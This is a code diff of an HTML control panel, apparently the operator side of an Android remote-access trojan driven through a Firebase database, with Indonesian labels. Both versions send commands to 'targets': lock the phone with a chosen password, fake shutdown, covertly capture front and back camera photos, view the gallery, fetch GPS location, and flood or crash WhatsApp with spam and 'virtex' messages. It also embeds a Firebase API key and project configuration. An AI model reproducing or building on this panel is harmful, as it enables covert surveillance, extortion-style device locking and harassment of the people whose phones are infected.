@@ -3,122 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OMNI-CONTROL DEVELOPER</title>
+    <title>WIDSEVERLY OMNI V12 - FULL AUDIO</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #a020f0; --bg-dark: #0d0d0d; --card-bg: #1a1a2e; --text-light: #e0e0e0; --wa-green: #25d366; }
-        body { background-color: var(--bg-dark); color: var(--text-light); font-family: 'Rajdhani', sans-serif; margin: 0; padding: 0; }
-        header { background: linear-gradient(90deg, #1a1a2e 0%, #a020f0 100%); padding: 20px; border-bottom: 2px solid var(--primary); box-shadow: 0 0 15px var(--primary); }
-        header h1 { font-family: 'Orbitron', sans-serif; margin: 0; font-size: 1.2rem; color: #fff; }
-        .container { display: grid; grid-template-columns: 280px 1fr; height: calc(100vh - 70px); }
-        .sidebar { background: #111; border-right: 1px solid #222; padding: 15px; overflow-y: auto; }
-        .target-item { background: rgba(160, 32, 240, 0.1); border: 1px solid var(--primary); border-radius: 10px; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
-        .target-item:hover, .target-item.active { background: var(--primary); color: #fff; box-shadow: 0 0 10px var(--primary); }
-        .main { padding: 20px; overflow-y: auto; }
-        .profile-card { background: var(--card-bg); border: 1px solid rgba(160, 32, 240, 0.3); border-radius: 15px; padding: 20px; margin-bottom: 20px; display: flex; align-items: center; gap: 15px; }
-        .profile-img { width: 60px; height: 60px; border-radius: 50%; background: var(--primary); border: 2px solid #fff; background-image: url('https://img.icons8.com/ios-filled/50/ffffff/user-shield.png'); background-size: 60%; background-position: center; background-repeat: no-repeat; }
-        .info-box { background: rgba(255, 255, 255, 0.05); border-radius: 12px; padding: 15px; border-left: 4px solid var(--primary); margin-bottom: 15px; }
-        .label { font-size: 0.7rem; color: #888; text-transform: uppercase; }
-        .value { font-size: 1rem; font-weight: bold; }
-        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
-        button { background: transparent; border: 2px solid var(--primary); color: var(--primary); padding: 12px; border-radius: 10px; font-family: 'Orbitron', sans-serif; font-size: 0.7rem; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
-        button:hover { background: var(--primary); color: #fff; box-shadow: 0 0 15px var(--primary); }
-        .btn-red { border-color: #ff0055; color: #ff0055; }
-        .btn-red:hover { background: #ff0055; box-shadow: 0 0 15px #ff0055; }
-        .btn-wa { border-color: var(--wa-green); color: var(--wa-green); }
-        .btn-wa:hover { background: var(--wa-green); color: #000; box-shadow: 0 0 15px var(--wa-green); }
-        #target-photo { width: 100%; max-width: 400px; border-radius: 15px; border: 2px solid var(--primary); margin-top: 15px; display: none; }
-        input { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 10px; margin-top: 10px; box-sizing: border-box; }
+        :root { --neon-red: #ff0033; --neon-blue: #00ffff; }
+        body { background: #000; color: #fff; font-family: 'Orbitron', sans-serif; margin: 0; overflow: hidden; }
+        #video-bg { position: fixed; top: 0; left: 0; min-width: 100%; min-height: 100%; z-index: -1; filter: brightness(40%); object-fit: cover; }
+        header { background: rgba(0,0,0,0.8); padding: 15px; border-bottom: 2px solid var(--neon-red); text-align: center; box-shadow: 0 0 20px var(--neon-red); }
+        .main-panel { padding: 15px; max-width: 600px; margin: auto; position: relative; z-index: 10; }
+        .control-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 20px; }
+        .btn-gacor { background: rgba(10, 10, 10, 0.7); border: 1.5px solid #444; border-radius: 12px; aspect-ratio: 1/1; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: 0.2s; backdrop-filter: blur(5px); }
+        .btn-gacor:active { transform: scale(0.9); box-shadow: 0 0 15px var(--neon-red); }
+        .btn-gacor i { font-size: 1.5rem; margin-bottom: 5px; }
+        #status-log { background: rgba(0,0,0,0.8); border: 1px solid #333; height: 70px; font-size: 0.6rem; padding: 8px; margin-top: 10px; color: #0f0; font-family: monospace; overflow-y: auto; border-left: 3px solid var(--neon-red); }
     </style>
 </head>
-<body>
-
-<header><h1>HAI, KING MASTER WARMZ</h1></header>
-
-<div class="container">
-    <div class="sidebar" id="list-container">
-        <h3 style="color: var(--primary);">TARGET LIST</h3>
-        <div id="target-items">Menunggu...</div>
-    </div>
-
-    <div class="main">
-        <div class="profile-card">
-            <div class="profile-img"></div>
-            <div>
-                <h2 id="active-id" style="margin:0;">PILIH TARGET</h2>
-                <span style="color:var(--primary); font-size:0.9rem; font-weight:bold; letter-spacing: 2px;">DEVELOPER</span>
-            </div>
-        </div>
-
-        <div class="info-box" style="border-left-color: var(--wa-green);">
-            <h3 style="margin:0; color: var(--wa-green);">WHATSAPP EXPLOIT</h3>
-            <div class="btn-group">
-                <button class="btn-wa" onclick="sendCmd('wa_bug')">FREEZE WA</button>
-                <button class="btn-wa" onclick="sendCmd('wa_spam')">SPAM CHAT</button>
-            </div>
-        </div>
-
-        <div class="info-box" style="border-left-color: #00f3ff;">
-            <h3 style="margin:0; color: #00f3ff;">STEALTH CAMERA</h3>
-            <div class="btn-group">
-                <button onclick="sendCmd('snap_front')">Snap Front</button>
-                <button onclick="sendCmd('snap_back')">Snap Back</button>
-            </div>
-            <img id="target-photo" src="">
-        </div>
-
-        <div class="info-box" style="border-left-color: #ff0055;">
-            <h3 style="margin:0; color: #ff0055;">REMOTE COMMAND</h3>
-            <input type="text" id="pass-val" placeholder="Set Brutal Password...">
-            <div class="btn-group">
-                <button class="btn-red" onclick="sendCmd('lock')">Lock Device</button>
-                <button style="border-color: #00ff00; color:#00ff00;" onclick="sendCmd('unlock')">Unlock</button>
-            </div>
+<body onclick="enableAudio()">
+    <video autoplay loop playsinline id="video-bg"><source src="https://github.com/hehehedihd-tech/Kalkulator-cyber/raw/refs/heads/main/VID_20260511_195624_258.mp4" type="video/mp4"></video>
+    <header><h2 style="margin:0; font-size: 1.1rem; letter-spacing: 2px;">WIDSEVERLY OMNI-REMOTE</h2></header>
+    <div class="main-panel">
+        <div id="status-log">System Audio: READY. Tap to enable Sound.<br>> Waiting for target...</div>
+        <div class="control-grid">
+            <div class="btn-gacor" style="border-color:var(--neon-red);" onclick="send('lock')"><i>🔒</i><span>LOCK HP</span></div>
+            <div class="btn-gacor" style="border-color:var(--neon-red);" onclick="send('unlock')"><i>🔓</i><span>UNLOCK</span></div>
+            <div class="btn-gacor" style="border-color:var(--neon-red);" onclick="send('fake_shutdown')"><i>🔌</i><span>OFF</span></div>
+            <div class="btn-gacor" style="border-color:var(--neon-blue);" onclick="send('camera_front')"><i>📸</i><span>FR-CAM</span></div>
+            <div class="btn-gacor" style="border-color:var(--neon-blue);" onclick="send('camera_back')"><i>📷</i><span>BK-CAM</span></div>
+            <div class="btn-gacor" style="border-color:var(--neon-blue);" onclick="send('view_gallery')"><i>🖼️</i><span>GALLERY</span></div>
+            <div class="btn-gacor" style="color:#f0f; border-color:#f0f;" onclick="send('wa_spam')"><i>💥</i><span>WA SPAM</span></div>
+            <div class="btn-gacor" style="color:#f0f; border-color:#f0f;" onclick="send('virtex')"><i>💀</i><span>VIRTEX</span></div>
+            <div class="btn-gacor" style="color:#ff0; border-color:#ff0;" onclick="send('location')"><i>📍</i><span>GPS</span></div>
         </div>
     </div>
-</div>
-
 <script>
+    const video = document.getElementById('video-bg');
+    function enableAudio() { video.muted = false; video.volume = 1.0; video.play(); }
     const firebaseConfig = {
-        apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU", authDomain: "https://remote-control-9bf2c.firebaseapp.com",
+        apiKey: "AIzaSyAS9ZCVt6iFXY8Ksd0o5z7fjXg3qi8rfhU",
+        authDomain: "remote-control-9bf2c.firebaseapp.com",
         databaseURL: "https://remote-control-9bf2c-default-rtdb.asia-southeast1.firebasedatabase.app",
-        projectId: "remote-control-9bf2c", storageBucket: "remote-control-9bf2c.firebasestorage.app",
-        messagingSenderId: "71798344189", appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
+        projectId: "remote-control-9bf2c",
+        storageBucket: "remote-control-9bf2c.firebasestorage.app",
+        messagingSenderId: "71798344189",
+        appId: "1:71798344189:web:6cdb414c1eab16c6b9b194"
     };
-
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let currentId = "";
-
-    db.ref('targets').on('value', (snap) => {
-        const container = document.getElementById('target-items');
-        container.innerHTML = "";
-        snap.forEach((child) => {
-            const div = document.createElement('div');
-            div.className = `target-item ${child.key === currentId ? 'active' : ''}`;
-            div.innerHTML = `<strong>${child.key}</strong><br><small style="font-size:0.6rem;">${child.val().device || 'Android'}</small>`;
-            div.onclick = () => selectTarget(child.key);
-            container.appendChild(div);
-        });
-    });
-
-    function selectTarget(id) {
-        currentId = id;
-        document.getElementById('active-id').innerText = id;
-        db.ref('targets/' + id).on('value', (snap) => {
-            const data = snap.val();
-            if(data.photo) { document.getElementById('target-photo').src = data.photo; document.getElementById('target-photo').style.display = 'block'; }
-        });
-    }
-
-    function sendCmd(act) {
-        if(!currentId) return alert("Pilih target!");
-        const p = document.getElementById('pass-val').value;
-        db.ref('targets/' + currentId + '/command').update({ action: act, password: p, t: Date.now() });
-        alert("Command Sent!");
-    }
+    function send(act) { db.ref('targets/Target_User_1/command').update({ action: act, time: Date.now() }).then(() => { document.getElementById('status-log').innerHTML += `> Command [${act}] sent...<br>`; }); }
 </script>
 </body>
 </html>
